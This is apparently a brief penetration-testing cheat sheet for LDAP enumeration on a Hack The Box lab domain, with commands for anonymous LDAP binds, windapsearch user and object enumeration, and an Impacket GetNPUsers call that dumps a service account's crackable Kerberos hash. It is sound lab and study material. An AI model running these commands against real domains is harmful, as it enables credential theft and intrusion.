# LDAP



Check anonymous binds

> The flag -x is used to specify anonymous authentication
>
> The flag -b denotes the basedn to start from

```bash
ldapsearch -h 10.10.10.161 -p 389 -x -b "dc=htb,dc=local"
```

Query the domain

> The flag -U is used to enumerate all users

```bash
python windapsearch.py -d hb.local --dc-ip 10.10.10.161 -U
```

Enumerate all others objects in the domain using the objectClass=\*

```bash
python windapsearch.py -d hb.local --dc-ip 10.10.10.161 --custom "objectClass=*"
```

Request TGT ticket and dump the hash

```bash
GetNPUsers.py htb.local/svc-alfresco -dc-ip 10.10.10.161 -no-pass
```



